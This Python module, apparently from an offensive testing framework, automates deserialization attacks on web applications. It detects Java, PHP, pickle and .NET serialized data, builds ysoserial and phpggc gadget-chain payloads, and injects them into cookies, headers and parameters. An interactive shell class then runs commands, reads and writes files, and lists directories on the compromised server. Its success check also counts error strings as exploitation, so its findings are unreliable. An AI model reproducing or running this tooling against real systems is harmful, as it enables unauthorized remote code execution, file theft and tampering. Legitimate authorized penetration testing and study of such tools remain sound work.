"""Deserialization exploitation module

This module implements:
- Detection of serialized data and format identification
- Integration with ysoserial for Java deserialization
- Integration with phpggc for PHP deserialization
- Automatic gadget chain testing
- Dependency analysis for exploitable libraries
"""

import asyncio
import base64
import json
import os
import re
import subprocess
import tempfile
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.models.target import TargetConfig


class SerializationFormat(Enum):
    """Detected serialization formats"""
    
    JAVA_SERIALIZED = "java_serialized"
    PHP_SERIALIZED = "php_serialized"
    PYTHON_PICKLE = "python_pickle"
    DOTNET_BINARY = "dotnet_binary"
    JSON = "json"
    XML = "xml"
    YAML = "yaml"
    UNKNOWN = "unknown"


class ProgrammingLanguage(Enum):
    """Programming languages for deserialization"""
    
    JAVA = "java"
    PHP = "php"
    PYTHON = "python"
    DOTNET = "dotnet"
    RUBY = "ruby"
    UNKNOWN = "unknown"


@dataclass
class SerializedDataInfo:
    """Information about detected serialized data"""
    
    format: SerializationFormat
    language: ProgrammingLanguage
    data: bytes
    location: str  # query, post, header, cookie
    parameter: str
    confidence: float
    indicators: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)


@dataclass
class GadgetChain:
    """Represents a gadget chain for exploitation"""
    
    name: str
    tool: str  # ysoserial, phpggc, etc.
    language: ProgrammingLanguage
    command: str
    description: str
    dependencies: List[str] = field(default_factory=list)
    payload: Optional[bytes] = None


@dataclass
class DeserializationResult:
    """Result of deserialization exploitation attempt"""
    
    serialized_data_info: SerializedDataInfo
    is_vulnerable: bool
    successful_gadget_chain: Optional[GadgetChain] = None
    tested_chains: List[GadgetChain] = field(default_factory=list)
    confidence: float = 0.0
    evidence: List[str] = field(default_factory=list)
    shell_available: bool = False
    metadata: Dict = field(default_factory=dict)



class SerializedDataDetector:
    """Detects serialized data and identifies format"""
    
    # Magic bytes and patterns for different serialization formats
    JAVA_MAGIC = b'\xac\xed\x00\x05'  # Java serialization magic bytes
    PHP_PATTERN = rb'[OaCbidsNr]:\d+:'  # PHP serialization pattern
    PICKLE_OPCODES = [b'\x80\x03', b'\x80\x04', b'\x80\x05']  # Python pickle protocol versions
    
    def __init__(self):
        """Initialize serialized data detector"""
        pass
    
    def detect_serialized_data(
        self,
        data: bytes,
        location: str,
        parameter: str,
    ) -> Optional[SerializedDataInfo]:
        """Detect if data is serialized and identify format
        
        Args:
            data: The data to analyze
            location: Where the data was found (query, post, header, cookie)
            parameter: Parameter name
        
        Returns:
            SerializedDataInfo if serialized data detected, None otherwise
        """
        # Try to decode if base64 encoded
        decoded_data = self._try_decode_base64(data)
        if decoded_data:
            data = decoded_data
        
        # Check for Java serialization
        java_info = self._detect_java_serialization(data, location, parameter)
        if java_info:
            return java_info
        
        # Check for PHP serialization
        php_info = self._detect_php_serialization(data, location, parameter)
        if php_info:
            return php_info
        
        # Check for Python pickle
        pickle_info = self._detect_python_pickle(data, location, parameter)
        if pickle_info:
            return pickle_info
        
        # Check for .NET binary serialization
        dotnet_info = self._detect_dotnet_serialization(data, location, parameter)
        if dotnet_info:
            return dotnet_info
        
        return None

    
    def _try_decode_base64(self, data: bytes) -> Optional[bytes]:
        """Try to decode base64 data
        
        Args:
            data: Data to decode
        
        Returns:
            Decoded data if successful, None otherwise
        """
        # Only try to decode if data looks like base64
        # (alphanumeric + / + = characters, reasonable length)
        try:
            data_str = data.decode('utf-8', errors='ignore')
            
            # Count non-base64 characters
            base64_chars = set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')
            non_base64_count = sum(1 for c in data_str if c not in base64_chars)
            
            # If more than 20% non-base64 characters, probably not base64
            if non_base64_count > len(data_str) * 0.2:
                return None
            
            # Try standard base64
            decoded = base64.b64decode(data, validate=True)
            # Only return if decoded data is different and meaningful
            if decoded != data and len(decoded) > 0:
                return decoded
        except Exception:
            pass
        
        return None
    
    def _detect_java_serialization(
        self, data: bytes, location: str, parameter: str
    ) -> Optional[SerializedDataInfo]:
        """Detect Java serialization
        
        Args:
            data: Data to analyze
            location: Data location
            parameter: Parameter name
        
        Returns:
            SerializedDataInfo if Java serialization detected
        """
        if data.startswith(self.JAVA_MAGIC):
            return SerializedDataInfo(
                format=SerializationFormat.JAVA_SERIALIZED,
                language=ProgrammingLanguage.JAVA,
                data=data,
                location=location,
                parameter=parameter,
                confidence=0.95,
                indicators=["Java magic bytes (0xACED0005) detected"],
                metadata={"magic_bytes": data[:4].hex()},
            )
        
        # Check for hex-encoded Java serialization
        if isinstance(data, bytes):
            try:
                data_str = data.decode('utf-8', errors='ignore')
                if 'aced0005' in data_str.lower():
                    return SerializedDataInfo(
                        format=SerializationFormat.JAVA_SERIALIZED,
                        language=ProgrammingLanguage.JAVA,
                        data=data,
                        location=location,
                        parameter=parameter,
                        confidence=0.85,
                        indicators=["Java magic bytes found in hex-encoded data"],
                    )
            except Exception:
                pass
        
        return None

    
    def _detect_php_serialization(
        self, data: bytes, location: str, parameter: str
    ) -> Optional[SerializedDataInfo]:
        """Detect PHP serialization
        
        Args:
            data: Data to analyze
            location: Data location
            parameter: Parameter name
        
        Returns:
            SerializedDataInfo if PHP serialization detected
        """
        if re.search(self.PHP_PATTERN, data):
            indicators = []
            
            # Check for common PHP serialization patterns
            if b'O:' in data:
                indicators.append("PHP object serialization detected (O:)")
            if b'a:' in data:
                indicators.append("PHP array serialization detected (a:)")
            if b's:' in data:
                indicators.append("PHP string serialization detected (s:)")
            
            return SerializedDataInfo(
                format=SerializationFormat.PHP_SERIALIZED,
                language=ProgrammingLanguage.PHP,
                data=data,
                location=location,
                parameter=parameter,
                confidence=0.90,
                indicators=indicators,
            )
        
        return None
    
    def _detect_python_pickle(
        self, data: bytes, location: str, parameter: str
    ) -> Optional[SerializedDataInfo]:
        """Detect Python pickle serialization
        
        Args:
            data: Data to analyze
            location: Data location
            parameter: Parameter name
        
        Returns:
            SerializedDataInfo if Python pickle detected
        """
        for opcode in self.PICKLE_OPCODES:
            if data.startswith(opcode):
                protocol_version = data[1] if len(data) > 1 else 0
                return SerializedDataInfo(
                    format=SerializationFormat.PYTHON_PICKLE,
                    language=ProgrammingLanguage.PYTHON,
                    data=data,
                    location=location,
                    parameter=parameter,
                    confidence=0.95,
                    indicators=[f"Python pickle protocol {protocol_version} detected"],
                    metadata={"protocol_version": protocol_version},
                )
        
        return None
    
    def _detect_dotnet_serialization(
        self, data: bytes, location: str, parameter: str
    ) -> Optional[SerializedDataInfo]:
        """Detect .NET binary serialization
        
        Args:
            data: Data to analyze
            location: Data location
            parameter: Parameter name
        
        Returns:
            SerializedDataInfo if .NET serialization detected
        """
        # .NET binary serialization often starts with specific bytes
        # This is a simplified check
        if data.startswith(b'\x00\x01\x00\x00\x00'):
            return SerializedDataInfo(
                format=SerializationFormat.DOTNET_BINARY,
                language=ProgrammingLanguage.DOTNET,
                data=data,
                location=location,
                parameter=parameter,
                confidence=0.75,
                indicators=[".NET binary serialization pattern detected"],
            )
        
        return None



class YsoserialIntegration:
    """Integration with ysoserial for Java deserialization exploitation"""
    
    # Common ysoserial gadget chains
    GADGET_CHAINS = [
        "CommonsCollections1",
        "CommonsCollections2",
        "CommonsCollections3",
        "CommonsCollections4",
        "CommonsCollections5",
        "CommonsCollections6",
        "CommonsCollections7",
        "Spring1",
        "Spring2",
        "ROME",
        "JDK7u21",
        "JDK8u20",
        "Groovy1",
        "Hibernate1",
        "Hibernate2",
        "C3P0",
        "Jython1",
        "CommonsBeanutils1",
    ]
    
    def __init__(self, ysoserial_path: Optional[str] = None):
        """Initialize ysoserial integration
        
        Args:
            ysoserial_path: Path to ysoserial JAR file
        """
        self.ysoserial_path = ysoserial_path or self._find_ysoserial()
    
    def _find_ysoserial(self) -> Optional[str]:
        """Try to find ysoserial in common locations
        
        Returns:
            Path to ysoserial if found, None otherwise
        """
        common_paths = [
            "/usr/local/bin/ysoserial.jar",
            "/opt/ysoserial/ysoserial.jar",
            str(Path.home() / "tools" / "ysoserial.jar"),
            "./ysoserial.jar",
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                return path
        
        return None
    
    def is_available(self) -> bool:
        """Check if ysoserial is available
        
        Returns:
            True if ysoserial is available, False otherwise
        """
        return self.ysoserial_path is not None and os.path.exists(self.ysoserial_path)
    
    def generate_payload(
        self,
        gadget_chain: str,
        command: str,
    ) -> Optional[bytes]:
        """Generate payload using ysoserial
        
        Args:
            gadget_chain: Name of the gadget chain to use
            command: Command to execute
        
        Returns:
            Generated payload bytes, or None if generation failed
        """
        if not self.is_available():
            return None
        
        try:
            # Run ysoserial
            result = subprocess.run(
                ["java", "-jar", self.ysoserial_path, gadget_chain, command],
                capture_output=True,
                timeout=30,
            )
            
            if result.returncode == 0:
                return result.stdout
            
        except Exception as e:
            print(f"Error generating ysoserial payload: {e}")
        
        return None
    
    def get_available_chains(self) -> List[str]:
        """Get list of available gadget chains
        
        Returns:
            List of gadget chain names
        """
        return self.GADGET_CHAINS.copy()



class PhpggcIntegration:
    """Integration with phpggc for PHP deserialization exploitation"""
    
    # Common phpggc gadget chains
    GADGET_CHAINS = [
        "Laravel/RCE1",
        "Laravel/RCE2",
        "Laravel/RCE3",
        "Laravel/RCE4",
        "Symfony/RCE1",
        "Symfony/RCE2",
        "Symfony/RCE3",
        "Symfony/RCE4",
        "Monolog/RCE1",
        "Monolog/RCE2",
        "Guzzle/RCE1",
        "Doctrine/RCE1",
        "Yii/RCE1",
        "CodeIgniter/RCE1",
        "CakePHP/RCE1",
        "Slim/RCE1",
        "SwiftMailer/FW1",
        "ZendFramework/RCE1",
    ]
    
    def __init__(self, phpggc_path: Optional[str] = None):
        """Initialize phpggc integration
        
        Args:
            phpggc_path: Path to phpggc executable
        """
        self.phpggc_path = phpggc_path or self._find_phpggc()
    
    def _find_phpggc(self) -> Optional[str]:
        """Try to find phpggc in common locations
        
        Returns:
            Path to phpggc if found, None otherwise
        """
        common_paths = [
            "/usr/local/bin/phpggc",
            "/opt/phpggc/phpggc",
            str(Path.home() / "tools" / "phpggc" / "phpggc"),
            "./phpggc",
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                return path
        
        # Try to find in PATH
        try:
            result = subprocess.run(
                ["which", "phpggc"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if result.returncode == 0:
                return result.stdout.strip()
        except Exception:
            pass
        
        return None
    
    def is_available(self) -> bool:
        """Check if phpggc is available
        
        Returns:
            True if phpggc is available, False otherwise
        """
        return self.phpggc_path is not None and os.path.exists(self.phpggc_path)
    
    def generate_payload(
        self,
        gadget_chain: str,
        command: str,
        encoding: str = "base64",
    ) -> Optional[bytes]:
        """Generate payload using phpggc
        
        Args:
            gadget_chain: Name of the gadget chain to use
            command: Command to execute
            encoding: Encoding to use (base64, url, etc.)
        
        Returns:
            Generated payload bytes, or None if generation failed
        """
        if not self.is_available():
            return None
        
        try:
            # Run phpggc
            cmd = [self.phpggc_path, gadget_chain, command]
            
            # Add encoding flag if specified
            if encoding:
                cmd.extend(["-b"])  # base64 encoding
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=30,
            )
            
            if result.returncode == 0:
                return result.stdout
            
        except Exception as e:
            print(f"Error generating phpggc payload: {e}")
        
        return None
    
    def get_available_chains(self) -> List[str]:
        """Get list of available gadget chains
        
        Returns:
            List of gadget chain names
        """
        if not self.is_available():
            return []
        
        try:
            # Run phpggc -l to list chains
            result = subprocess.run(
                [self.phpggc_path, "-l"],
                capture_output=True,
                text=True,
                timeout=10,
            )
            
            if result.returncode == 0:
                # Parse output to extract chain names
                chains = []
                for line in result.stdout.split('\n'):
                    # Look for lines with chain names (format: "Name/Type")
                    if '/' in line and not line.startswith(' '):
                        parts = line.split()
                        if parts:
                            chains.append(parts[0])
                return chains
        except Exception:
            pass
        
        # Return default list if listing fails
        return self.GADGET_CHAINS.copy()



class DeserializationTester:
    """Main deserialization exploitation tester"""
    
    def __init__(
        self,
        request_handler: RequestHandler,
        ysoserial_path: Optional[str] = None,
        phpggc_path: Optional[str] = None,
    ):
        """Initialize deserialization tester
        
        Args:
            request_handler: Request handler for HTTP communication
            ysoserial_path: Optional path to ysoserial
            phpggc_path: Optional path to phpggc
        """
        self.request_handler = request_handler
        self.detector = SerializedDataDetector()
        self.ysoserial = YsoserialIntegration(ysoserial_path)
        self.phpggc = PhpggcIntegration(phpggc_path)
    
    async def scan_for_serialized_data(
        self,
        target: TargetConfig,
        response: Response,
    ) -> List[SerializedDataInfo]:
        """Scan response for serialized data
        
        Args:
            target: Target configuration
            response: HTTP response to scan
        
        Returns:
            List of detected serialized data
        """
        detected = []
        
        # Check response body
        body_info = self.detector.detect_serialized_data(
            response.body,
            location="response_body",
            parameter="body",
        )
        if body_info:
            detected.append(body_info)
        
        # Check cookies
        for cookie_name, cookie_value in response.cookies.items():
            cookie_bytes = cookie_value.encode('utf-8')
            cookie_info = self.detector.detect_serialized_data(
                cookie_bytes,
                location="cookie",
                parameter=cookie_name,
            )
            if cookie_info:
                detected.append(cookie_info)
        
        # Check headers
        for header_name, header_value in response.headers.items():
            header_bytes = header_value.encode('utf-8')
            header_info = self.detector.detect_serialized_data(
                header_bytes,
                location="header",
                parameter=header_name,
            )
            if header_info:
                detected.append(header_info)
        
        return detected
    
    async def test_deserialization(
        self,
        target: TargetConfig,
        serialized_data_info: SerializedDataInfo,
        test_command: str = "whoami",
    ) -> DeserializationResult:
        """Test for deserialization vulnerability
        
        Args:
            target: Target configuration
            serialized_data_info: Information about serialized data
            test_command: Command to test with
        
        Returns:
            DeserializationResult with test results
        """
        tested_chains = []
        successful_chain = None
        
        # Test based on detected language
        if serialized_data_info.language == ProgrammingLanguage.JAVA:
            successful_chain = await self._test_java_deserialization(
                target,
                serialized_data_info,
                test_command,
                tested_chains,
            )
        elif serialized_data_info.language == ProgrammingLanguage.PHP:
            successful_chain = await self._test_php_deserialization(
                target,
                serialized_data_info,
                test_command,
                tested_chains,
            )
        
        # Determine if vulnerable
        is_vulnerable = successful_chain is not None
        confidence = 0.95 if is_vulnerable else 0.0
        
        evidence = []
        if is_vulnerable:
            evidence.append(f"Successful exploitation with {successful_chain.name}")
            evidence.append(f"Tool: {successful_chain.tool}")
            evidence.append(f"Command: {test_command}")
        
        return DeserializationResult(
            serialized_data_info=serialized_data_info,
            is_vulnerable=is_vulnerable,
            successful_gadget_chain=successful_chain,
            tested_chains=tested_chains,
            confidence=confidence,
            evidence=evidence,
            shell_available=is_vulnerable,
        )

    
    async def _test_java_deserialization(
        self,
        target: TargetConfig,
        serialized_data_info: SerializedDataInfo,
        test_command: str,
        tested_chains: List[GadgetChain],
    ) -> Optional[GadgetChain]:
        """Test Java deserialization with ysoserial
        
        Args:
            target: Target configuration
            serialized_data_info: Serialized data information
            test_command: Command to test
            tested_chains: List to append tested chains to
        
        Returns:
            Successful GadgetChain if found, None otherwise
        """
        if not self.ysoserial.is_available():
            return None
        
        # Get available gadget chains
        chains = self.ysoserial.get_available_chains()
        
        # Test each chain
        for chain_name in chains:
            # Generate payload
            payload = self.ysoserial.generate_payload(chain_name, test_command)
            
            if not payload:
                continue
            
            # Create gadget chain object
            gadget_chain = GadgetChain(
                name=chain_name,
                tool="ysoserial",
                language=ProgrammingLanguage.JAVA,
                command=test_command,
                description=f"Java deserialization gadget chain: {chain_name}",
                payload=payload,
            )
            tested_chains.append(gadget_chain)
            
            # Test the payload
            is_successful = await self._test_payload(
                target,
                serialized_data_info,
                payload,
            )
            
            if is_successful:
                return gadget_chain
        
        return None
    
    async def _test_php_deserialization(
        self,
        target: TargetConfig,
        serialized_data_info: SerializedDataInfo,
        test_command: str,
        tested_chains: List[GadgetChain],
    ) -> Optional[GadgetChain]:
        """Test PHP deserialization with phpggc
        
        Args:
            target: Target configuration
            serialized_data_info: Serialized data information
            test_command: Command to test
            tested_chains: List to append tested chains to
        
        Returns:
            Successful GadgetChain if found, None otherwise
        """
        if not self.phpggc.is_available():
            return None
        
        # Get available gadget chains
        chains = self.phpggc.get_available_chains()
        
        # Test each chain
        for chain_name in chains:
            # Generate payload
            payload = self.phpggc.generate_payload(chain_name, test_command)
            
            if not payload:
                continue
            
            # Create gadget chain object
            gadget_chain = GadgetChain(
                name=chain_name,
                tool="phpggc",
                language=ProgrammingLanguage.PHP,
                command=test_command,
                description=f"PHP deserialization gadget chain: {chain_name}",
                payload=payload,
            )
            tested_chains.append(gadget_chain)
            
            # Test the payload
            is_successful = await self._test_payload(
                target,
                serialized_data_info,
                payload,
            )
            
            if is_successful:
                return gadget_chain
        
        return None
    
    async def _test_payload(
        self,
        target: TargetConfig,
        serialized_data_info: SerializedDataInfo,
        payload: bytes,
    ) -> bool:
        """Test a deserialization payload
        
        Args:
            target: Target configuration
            serialized_data_info: Serialized data information
            payload: Payload to test
        
        Returns:
            True if payload appears successful, False otherwise
        """
        try:
            # Encode payload (base64 is common)
            encoded_payload = base64.b64encode(payload).decode('utf-8')
            
            # Send request with payload based on location
            if serialized_data_info.location == "cookie":
                response = await self.request_handler.send_request(
                    method="GET",
                    url=target.url,
                    headers=target.custom_headers,
                    cookies={serialized_data_info.parameter: encoded_payload},
                )
            elif serialized_data_info.location == "header":
                headers = target.custom_headers.copy()
                headers[serialized_data_info.parameter] = encoded_payload
                response = await self.request_handler.send_request(
                    method="GET",
                    url=target.url,
                    headers=headers,
                )
            elif serialized_data_info.location == "post":
                response = await self.request_handler.send_request(
                    method="POST",
                    url=target.url,
                    headers=target.custom_headers,
                    data={serialized_data_info.parameter: encoded_payload},
                )
            else:
                # Default to query parameter
                from urllib.parse import urlencode
                url_with_param = f"{target.url}?{urlencode({serialized_data_info.parameter: encoded_payload})}"
                response = await self.request_handler.send_request(
                    method="GET",
                    url=url_with_param,
                    headers=target.custom_headers,
                )
            
            # Check for success indicators
            # This is simplified - in practice, you'd use OOB callbacks or other detection
            success_indicators = [
                b"root:",  # Output from whoami on Linux
                b"nt authority",  # Output from whoami on Windows
                b"uid=",  # Output from id command
            ]
            
            for indicator in success_indicators:
                if indicator in response.body.lower():
                    return True
            
            # Check for errors that might indicate execution
            error_indicators = [
                b"command not found",
                b"cannot execute",
                b"permission denied",
            ]
            
            for indicator in error_indicators:
                if indicator in response.body.lower():
                    return True
            
        except Exception as e:
            print(f"Error testing payload: {e}")
        
        return False



class DependencyAnalyzer:
    """Analyzes dependencies to identify exploitable libraries"""
    
    # Known vulnerable library versions and their gadget chains
    JAVA_VULNERABLE_LIBS = {
        "commons-collections": {
            "versions": ["3.1", "3.2", "3.2.1", "4.0"],
            "gadget_chains": ["CommonsCollections1", "CommonsCollections2", "CommonsCollections3", 
                             "CommonsCollections4", "CommonsCollections5", "CommonsCollections6"],
            "description": "Apache Commons Collections deserialization vulnerability",
        },
        "spring-core": {
            "versions": ["4.1.4", "4.2.0"],
            "gadget_chains": ["Spring1", "Spring2"],
            "description": "Spring Framework deserialization vulnerability",
        },
        "rome": {
            "versions": ["1.0"],
            "gadget_chains": ["ROME"],
            "description": "ROME RSS/Atom library deserialization vulnerability",
        },
        "groovy": {
            "versions": ["2.3.9", "2.4.3"],
            "gadget_chains": ["Groovy1"],
            "description": "Groovy language deserialization vulnerability",
        },
        "hibernate": {
            "versions": ["5.0.0", "5.1.0"],
            "gadget_chains": ["Hibernate1", "Hibernate2"],
            "description": "Hibernate ORM deserialization vulnerability",
        },
        "c3p0": {
            "versions": ["0.9.5.2"],
            "gadget_chains": ["C3P0"],
            "description": "C3P0 connection pool deserialization vulnerability",
        },
    }
    
    PHP_VULNERABLE_LIBS = {
        "laravel/framework": {
            "versions": ["5.4.0", "5.5.0", "5.6.0", "5.7.0", "5.8.0"],
            "gadget_chains": ["Laravel/RCE1", "Laravel/RCE2", "Laravel/RCE3", "Laravel/RCE4"],
            "description": "Laravel framework deserialization vulnerability",
        },
        "symfony/symfony": {
            "versions": ["3.4.0", "4.0.0", "4.1.0"],
            "gadget_chains": ["Symfony/RCE1", "Symfony/RCE2", "Symfony/RCE3", "Symfony/RCE4"],
            "description": "Symfony framework deserialization vulnerability",
        },
        "monolog/monolog": {
            "versions": ["1.0", "2.0"],
            "gadget_chains": ["Monolog/RCE1", "Monolog/RCE2"],
            "description": "Monolog logging library deserialization vulnerability",
        },
        "guzzlehttp/guzzle": {
            "versions": ["6.0.0"],
            "gadget_chains": ["Guzzle/RCE1"],
            "description": "Guzzle HTTP client deserialization vulnerability",
        },
    }
    
    def __init__(self):
        """Initialize dependency analyzer"""
        pass
    
    def analyze_dependencies(
        self,
        language: ProgrammingLanguage,
        dependencies: List[str],
    ) -> List[Dict[str, Any]]:
        """Analyze dependencies to identify exploitable libraries
        
        Args:
            language: Programming language
            dependencies: List of dependencies (format: "library:version")
        
        Returns:
            List of exploitable libraries with suggested gadget chains
        """
        exploitable = []
        
        if language == ProgrammingLanguage.JAVA:
            exploitable = self._analyze_java_dependencies(dependencies)
        elif language == ProgrammingLanguage.PHP:
            exploitable = self._analyze_php_dependencies(dependencies)
        
        return exploitable
    
    def _analyze_java_dependencies(
        self, dependencies: List[str]
    ) -> List[Dict[str, Any]]:
        """Analyze Java dependencies
        
        Args:
            dependencies: List of Java dependencies
        
        Returns:
            List of exploitable libraries
        """
        exploitable = []
        
        for dep in dependencies:
            # Parse dependency (format: "groupId:artifactId:version")
            parts = dep.split(':')
            if len(parts) < 2:
                continue
            
            artifact_id = parts[1] if len(parts) >= 2 else parts[0]
            version = parts[2] if len(parts) >= 3 else "unknown"
            
            # Check against known vulnerable libraries
            for lib_name, lib_info in self.JAVA_VULNERABLE_LIBS.items():
                if lib_name in artifact_id.lower():
                    exploitable.append({
                        "library": dep,
                        "artifact_id": artifact_id,
                        "version": version,
                        "gadget_chains": lib_info["gadget_chains"],
                        "description": lib_info["description"],
                        "is_vulnerable_version": version in lib_info["versions"] or version == "unknown",
                    })
        
        return exploitable
    
    def _analyze_php_dependencies(
        self, dependencies: List[str]
    ) -> List[Dict[str, Any]]:
        """Analyze PHP dependencies
        
        Args:
            dependencies: List of PHP dependencies
        
        Returns:
            List of exploitable libraries
        """
        exploitable = []
        
        for dep in dependencies:
            # Parse dependency (format: "vendor/package:version")
            parts = dep.split(':')
            package = parts[0]
            version = parts[1] if len(parts) > 1 else "unknown"
            
            # Check against known vulnerable libraries
            for lib_name, lib_info in self.PHP_VULNERABLE_LIBS.items():
                if lib_name in package.lower():
                    exploitable.append({
                        "library": dep,
                        "package": package,
                        "version": version,
                        "gadget_chains": lib_info["gadget_chains"],
                        "description": lib_info["description"],
                        "is_vulnerable_version": version in lib_info["versions"] or version == "unknown",
                    })
        
        return exploitable
    
    def extract_dependencies_from_response(
        self,
        response: Response,
        language: ProgrammingLanguage,
    ) -> List[str]:
        """Extract dependencies from HTTP response
        
        Args:
            response: HTTP response
            language: Programming language
        
        Returns:
            List of detected dependencies
        """
        dependencies = []
        
        # Check headers for version information
        for header_name, header_value in response.headers.items():
            if language == ProgrammingLanguage.JAVA:
                # Look for Java-specific headers
                if 'server' in header_name.lower():
                    # Parse server header for Java containers
                    if 'tomcat' in header_value.lower():
                        dependencies.append(f"apache:tomcat:{self._extract_version(header_value)}")
                    elif 'jetty' in header_value.lower():
                        dependencies.append(f"eclipse:jetty:{self._extract_version(header_value)}")
            
            elif language == ProgrammingLanguage.PHP:
                # Look for PHP-specific headers
                if 'x-powered-by' in header_name.lower():
                    if 'php' in header_value.lower():
                        dependencies.append(f"php:php:{self._extract_version(header_value)}")
        
        # Check response body for dependency information
        response_text = response.text.lower()
        
        if language == ProgrammingLanguage.JAVA:
            # Look for common Java libraries in error messages
            if 'commons-collections' in response_text:
                dependencies.append("commons-collections:commons-collections:unknown")
            if 'spring' in response_text:
                dependencies.append("org.springframework:spring-core:unknown")
        
        elif language == ProgrammingLanguage.PHP:
            # Look for common PHP frameworks
            if 'laravel' in response_text:
                dependencies.append("laravel/framework:unknown")
            if 'symfony' in response_text:
                dependencies.append("symfony/symfony:unknown")
        
        return dependencies
    
    def _extract_version(self, text: str) -> str:
        """Extract version number from text
        
        Args:
            text: Text to extract version from
        
        Returns:
            Version string or "unknown"
        """
        # Look for version patterns like "1.2.3" or "v1.2.3"
        version_pattern = r'v?(\d+\.\d+(?:\.\d+)?)'
        match = re.search(version_pattern, text)
        
        if match:
            return match.group(1)
        
        return "unknown"
    
    def suggest_gadget_chains(
        self,
        language: ProgrammingLanguage,
        dependencies: List[str],
    ) -> List[str]:
        """Suggest appropriate gadget chains based on dependencies
        
        Args:
            language: Programming language
            dependencies: List of dependencies
        
        Returns:
            List of suggested gadget chain names
        """
        exploitable = self.analyze_dependencies(language, dependencies)
        
        # Collect all suggested gadget chains
        suggested_chains = []
        for lib in exploitable:
            if lib.get("is_vulnerable_version", False):
                suggested_chains.extend(lib["gadget_chains"])
        
        # Remove duplicates while preserving order
        seen = set()
        unique_chains = []
        for chain in suggested_chains:
            if chain not in seen:
                seen.add(chain)
                unique_chains.append(chain)
        
        return unique_chains



class InteractiveShell:
    """Interactive shell interface for deserialization exploitation"""
    
    def __init__(
        self,
        request_handler: RequestHandler,
        target: TargetConfig,
        serialized_data_info: SerializedDataInfo,
        gadget_chain: GadgetChain,
    ):
        """Initialize interactive shell
        
        Args:
            request_handler: Request handler for HTTP communication
            target: Target configuration
            serialized_data_info: Serialized data information
            gadget_chain: Successful gadget chain
        """
        self.request_handler = request_handler
        self.target = target
        self.serialized_data_info = serialized_data_info
        self.gadget_chain = gadget_chain
        
        # Initialize appropriate tool integration
        if gadget_chain.language == ProgrammingLanguage.JAVA:
            self.tool = YsoserialIntegration()
        elif gadget_chain.language == ProgrammingLanguage.PHP:
            self.tool = PhpggcIntegration()
        else:
            self.tool = None
    
    async def execute_command(self, command: str) -> Dict[str, Any]:
        """Execute a command through deserialization
        
        Args:
            command: Command to execute
        
        Returns:
            Dictionary with execution results
        """
        if not self.tool:
            return {
                "success": False,
                "error": "Tool not available for this language",
            }
        
        # Generate payload for the command
        if isinstance(self.tool, YsoserialIntegration):
            payload = self.tool.generate_payload(
                self.gadget_chain.name,
                command,
            )
        elif isinstance(self.tool, PhpggcIntegration):
            payload = self.tool.generate_payload(
                self.gadget_chain.name,
                command,
            )
        else:
            return {
                "success": False,
                "error": "Unknown tool type",
            }
        
        if not payload:
            return {
                "success": False,
                "error": "Failed to generate payload",
            }
        
        # Send the payload
        try:
            encoded_payload = base64.b64encode(payload).decode('utf-8')
            
            # Send request based on location
            if self.serialized_data_info.location == "cookie":
                response = await self.request_handler.send_request(
                    method="GET",
                    url=self.target.url,
                    headers=self.target.custom_headers,
                    cookies={self.serialized_data_info.parameter: encoded_payload},
                )
            elif self.serialized_data_info.location == "header":
                headers = self.target.custom_headers.copy()
                headers[self.serialized_data_info.parameter] = encoded_payload
                response = await self.request_handler.send_request(
                    method="GET",
                    url=self.target.url,
                    headers=headers,
                )
            elif self.serialized_data_info.location == "post":
                response = await self.request_handler.send_request(
                    method="POST",
                    url=self.target.url,
                    headers=self.target.custom_headers,
                    data={self.serialized_data_info.parameter: encoded_payload},
                )
            else:
                from urllib.parse import urlencode
                url_with_param = f"{self.target.url}?{urlencode({self.serialized_data_info.parameter: encoded_payload})}"
                response = await self.request_handler.send_request(
                    method="GET",
                    url=url_with_param,
                    headers=self.target.custom_headers,
                )
            
            return {
                "success": True,
                "command": command,
                "status_code": response.status_code,
                "response_body": response.text,
                "response_length": len(response.body),
            }
        
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
            }
    
    async def read_file(self, file_path: str) -> Dict[str, Any]:
        """Read a file through deserialization
        
        Args:
            file_path: Path to file to read
        
        Returns:
            Dictionary with file contents
        """
        # Use cat command to read file
        command = f"cat {file_path}"
        result = await self.execute_command(command)
        
        if result.get("success"):
            return {
                "success": True,
                "file_path": file_path,
                "contents": result.get("response_body", ""),
            }
        else:
            return result
    
    async def write_file(self, file_path: str, contents: str) -> Dict[str, Any]:
        """Write a file through deserialization
        
        Args:
            file_path: Path to file to write
            contents: Contents to write
        
        Returns:
            Dictionary with write results
        """
        # Use echo command to write file
        # Escape contents for shell
        escaped_contents = contents.replace("'", "'\\''")
        command = f"echo '{escaped_contents}' > {file_path}"
        result = await self.execute_command(command)
        
        if result.get("success"):
            return {
                "success": True,
                "file_path": file_path,
                "message": "File written successfully",
            }
        else:
            return result
    
    async def list_directory(self, directory: str = ".") -> Dict[str, Any]:
        """List directory contents through deserialization
        
        Args:
            directory: Directory to list
        
        Returns:
            Dictionary with directory listing
        """
        command = f"ls -la {directory}"
        result = await self.execute_command(command)
        
        if result.get("success"):
            return {
                "success": True,
                "directory": directory,
                "listing": result.get("response_body", ""),
            }
        else:
            return result
